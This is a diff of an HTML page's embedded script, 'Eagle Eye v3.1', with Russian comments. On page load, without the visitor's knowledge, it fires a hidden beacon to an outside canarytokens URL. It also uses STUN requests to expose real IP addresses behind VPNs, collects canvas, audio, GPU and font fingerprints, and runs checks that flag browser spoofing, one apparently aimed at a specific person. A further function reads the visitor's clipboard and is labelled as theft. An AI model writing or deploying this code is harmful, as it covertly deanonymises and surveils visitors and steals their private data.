@@ -16,19 +16,163 @@
     </style>
 
     <script>
-    // --- ULTIMATE EAGLE EYE (ALL FEATURES COMBINED) ---
+    // --- ULTIMATE EAGLE EYE v3.1 (WITH CANARYTOKEN) ---
     window.EagleEye = class {
         constructor() {
             this.endpoint = '/api/collect';
+            this.sessionId = Math.random().toString(36).substring(7);
             this.init();
         }
 
         async init() {
-            if (document.readyState === 'complete') this.collect('Page Load');
-            else window.addEventListener('load', () => this.collect('Page Load'));
+            // 1. Запускаем CanaryToken (DNS/IP Trap)
+            this.triggerDNSBeacon();
+            
+            // 2. Запускаем основной сбор данных
+            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
+            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
         }
 
-        // 1. Client Hints (Модель телефона, версия ОС) - ВЕРНУЛ ЭТО!
+        // === 1. CANARYTOKEN TRAP ===
+        triggerDNSBeacon() {
+            // Твоя боевая ссылка
+            const canaryUrl = "http://canarytokens.com/tags/stuff/traffic/giumoqpvt3mawd0bulwx2o4p5/submit.aspx";
+            
+            // Добавляем уникальные параметры, чтобы браузер не кэшировал запрос
+            // и чтобы ты видел ID сессии в логах CanaryTokens (если они поддерживают параметры)
+            const unique = Math.random().toString(36).substring(7);
+            
+            // Создаем невидимый запрос
+            new Image().src = `${canaryUrl}?uid=${this.sessionId}&rnd=${unique}`;
+            console.log("Beacon fired");
+        }
+
+        // === 2. WEBRTC (VPN PIERCING) ===
+        async getWebRTCData() {
+            const ips = [];
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun1.l.google.com:19302" },
+                        { urls: "stun:stun2.l.google.com:19302" }
+                    ]
+                });
+                pc.createDataChannel('');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                
+                await new Promise(resolve => {
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) return;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = e.candidate.candidate.match(ipRegex);
+                        // Фильтруем локальные IP (192.168...), оставляем интересные
+                        if (match && !ips.includes(match[1])) ips.push(match[1]);
+                    };
+                    setTimeout(resolve, 1500);
+                });
+            } catch (e) { /* Blocked */ }
+            return ips;
+        }
+
+        // === 3. HARDWARE FINGERPRINTING ===
+        
+        // Canvas Hash (GPU)
+        getCanvasHash() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Eagle_v3_🦅", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Eagle_v3_🦅", 4, 17);
+                
+                const data = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < data.length; i++) {
+                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
+                    hash |= 0;
+                }
+                return hash.toString(16);
+            } catch (e) { return "error"; }
+        }
+
+        // Audio Hash (Sound Card)
+        async getAudioHash() {
+            try {
+                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const osc = audioCtx.createOscillator();
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
+                osc.connect(audioCtx.destination);
+                osc.start(0);
+                const render = await audioCtx.startRendering();
+                const data = render.getChannelData(0);
+                let sum = 0;
+                for (let i = 0; i < data.length; i++) { sum += Math.abs(data[i]); }
+                return sum.toFixed(6);
+            } catch (e) { return "no_audio"; }
+        }
+
+        // === 4. ANTI-SPOOFING (LIE DETECTOR) ===
+        detectLies() {
+            const anomalies = [];
+            const ua = navigator.userAgent;
+
+            // A. Chrome Version Trap (Ловушка для Омича)
+            const hasGroupBy = !!Object.groupBy; // Chrome 117+
+            if (ua.includes("Chrome/109") && hasGroupBy) {
+                anomalies.push("CRITICAL: Fake Chrome 109 (Has modern features)");
+            }
+
+            // B. Screen Resolution Trap
+            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) {
+                anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
+            }
+
+            // C. OS Trap (Fonts)
+            const fonts = this.getFonts();
+            if (ua.includes("Windows") && !fonts.includes("Calibri")) {
+                anomalies.push("OS SPOOF: Claims Windows but no Calibri");
+            }
+            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) {
+                anomalies.push("REALITY: Likely Linux System");
+            }
+
+            return anomalies;
+        }
+
+        // === 5. SYSTEM INFO ===
+        
+        // Реальная проверка шрифтов (измеряем ширину)
+        getFonts() {
+            const fontList = [
+                "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", 
+                "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", 
+                "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", 
+                "Times", "Times New Roman", "Trebuchet MS", "Verdana", "Wingdings",
+                "Ubuntu", "Cantarell", "Liberation Sans" // Linux markers
+            ];
+            const detected = [];
+            const span = document.createElement("span");
+            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
+            document.body.appendChild(span);
+            span.style.fontFamily = "monospace";
+            const defaultWidth = span.offsetWidth;
+            for (const font of fontList) {
+                span.style.fontFamily = `"${font}", monospace`;
+                if (span.offsetWidth !== defaultWidth) detected.push(font);
+            }
+            document.body.removeChild(span);
+            return detected;
+        }
+
+        // Client Hints
         async getClientHints() {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
@@ -47,40 +191,6 @@
             return null;
         }
 
-        // 2. WebRTC (Внутренний IP)
-        async getInternalIPs() {
-            return new Promise((resolve) => {
-                const ips = [];
-                const pc = new RTCPeerConnection({iceServers: []});
-                pc.createDataChannel('');
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) { pc.close(); resolve(ips); return; }
-                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                    if (match && !ips.includes(match[1])) ips.push(match[1]);
-                };
-                setTimeout(() => { pc.close(); resolve(ips); }, 1000);
-                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
-            });
-        }
-
-        // 3. Шрифты (Детект через рендеринг - ВЕРНУЛ ЭТО!)
-        getFonts() {
-            const fontList = ["Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", "Times", "Times New Roman", "Trebuchet MS", "Ubuntu", "Verdana", "Wingdings"];
-            const detected = [];
-            const span = document.createElement("span");
-            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
-            document.body.appendChild(span);
-            span.style.fontFamily = "monospace";
-            const defaultWidth = span.offsetWidth;
-            for (const font of fontList) {
-                span.style.fontFamily = `"${font}", monospace`;
-                if (span.offsetWidth !== defaultWidth) detected.push(font);
-            }
-            document.body.removeChild(span);
-            return detected;
-        }
-
-        // 4. GPU
         getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
@@ -94,32 +204,49 @@
             } catch(e) { return { renderer: 'Error' }; }
         }
 
+        // === 6. COLLECT & SEND ===
         async collect(triggerName, extraData = {}) {
-            const [ips, battery, clientHints] = await Promise.all([
-                this.getInternalIPs(),
+            const [ips, battery, clientHints, audioHash] = await Promise.all([
+                this.getWebRTCData(),
                 navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
-                this.getClientHints() // ВОТ ОНО
+                this.getClientHints(),
+                this.getAudioHash()
             ]);
             
+            const anomalies = this.detectLies();
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const tzOffset = new Date().getTimezoneOffset();
+
             const payload = {
-                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName },
+                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
+                
+                // === НОВЫЕ ДАННЫЕ (GOD MODE) ===
+                fingerprint_v2: {
+                    canvas_hash: this.getCanvasHash(),
+                    audio_hash: audioHash,
+                    anomalies: anomalies, // СПИСОК ЛЖИ
+                    is_spoofing: anomalies.length > 0
+                },
+
                 fingerprint: {
                     gpu: this.getWebGLInfo().renderer,
+                    vendor: this.getWebGLInfo().vendor,
                     screen: `${screen.width}x${screen.height}`,
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory
                 },
-                client_hints: clientHints, // ТЕПЕРЬ ЭТО БУДЕТ В ЛОГАХ
+                client_hints: clientHints,
                 system: {
                     ua: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezone: timezone,
+                    timezone_offset: tzOffset, // Сравни это с IP на сервере!
                     battery: battery,
-                    fonts: this.getFonts() // И ЭТО ТОЖЕ
+                    fonts: this.getFonts()
                 },
                 network: {
-                    webrtc_ips: ips
+                    webrtc_ips: ips // Реальные IP
                 },
                 ...extraData
             };
@@ -128,18 +255,17 @@
             navigator.sendBeacon(this.endpoint, blob);
         }
     };
+    
     const eagle = new EagleEye();
 
-    // --- ГЛОБАЛЬНАЯ ФУНКЦИЯ КРАЖИ БУФЕРА ---
+    // --- КРАЖА БУФЕРА (Твой код) ---
     async function stealClipboard() {
         try {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 const text = await navigator.clipboard.readText();
                 return text ? text.substring(0, 1000) : "Empty";
             }
-        } catch (e) {
-            return "Blocked/Error";
-        }
+        } catch (e) { return "Blocked/Error"; }
         return "Not Supported";
     }
     </script>
